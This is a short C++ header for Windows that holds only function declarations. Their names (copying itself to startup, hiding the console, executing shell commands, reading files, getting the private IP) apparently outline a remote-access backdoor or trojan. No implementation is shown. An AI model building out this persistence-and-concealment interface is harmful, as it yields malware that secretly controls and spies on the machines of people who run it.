#pragma once
#include <iostream>
#include <array>
#include <fstream>
#include <string>
#include <Windows.h>

uint32_t getPrivateIP();

bool isRunning();

bool isInStartUp(char* filePath);

void copyToStartUp(char* filePath);

void executeStartUpFile();

std::string executeShell(char* command);

std::string switchDir(char* arg);

void hideConsole();

std::string readFile(std::string fileName);